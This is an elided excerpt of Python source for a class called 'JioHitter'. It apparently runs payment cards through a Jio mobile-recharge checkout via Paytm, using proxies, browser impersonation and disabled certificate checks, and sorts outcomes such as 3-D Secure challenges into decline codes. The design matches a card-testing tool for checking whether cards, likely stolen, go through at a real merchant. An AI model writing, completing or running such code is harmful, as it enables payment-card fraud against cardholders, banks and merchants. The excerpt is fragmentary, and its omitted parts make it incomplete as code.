...
class JioHitter:
    def __init__(self, phone_number: str, proxy_data: Optional[dict] = None, plan_amount: Optional[float] = None):
    ...
    async def hit(self, card: dict, attempt: int = 1) -> dict:
        t0 = time.time()
        ...
        try:
            async with AsyncSession(impersonate=pf["imp"], proxies=proxies, timeout=25, verify=False) as s:
                ...
                if "paytmpayments.com" in eu.lower() or "paytm" in str(r_bank.url).lower() or "paytm" in r_bank.text.lower():
                    # Look for transactionStatus submit form
                    ea2 = re.search(r"action=['\"]([^'\"]+)['\"]", r_bank.text)
                    ei2 = re.findall(r"name=['\"]([^'\"]+)['\"]\s+value=['\"]([^'\"]*)['\"]", r_bank.text)
                    if ea2:
                        eu2 = ea2.group(1)
                    ...
                    # If no secondary form, bank response itself is challenge or status
                    result["response_time"] = round(time.time() - t0, 2)
                ...
                # Check Direct Bank 3DS Challenge (e.g., ACS Entersekt, Cardinal, Visa Secure, Mastercard ID Check)
                ...
                if any(ind in bank_url_str for ind in ["mdpayacs", "acs", "entersekt", "cardinalcommerce", "arcot", "3dsecure", "centinel", "challenge"]) or \
                   any(term in bank_text_lower for term in ["verification code", "verify by phone", "one time password", "enter the verification code", "resend code", "challengeinfo", "secure checkout"]):
                    result["response_time"] = round(time.time() - t0, 2)
                    result["decline_code"] = "3ds_required"
                    # Try to extract phone hint if visible
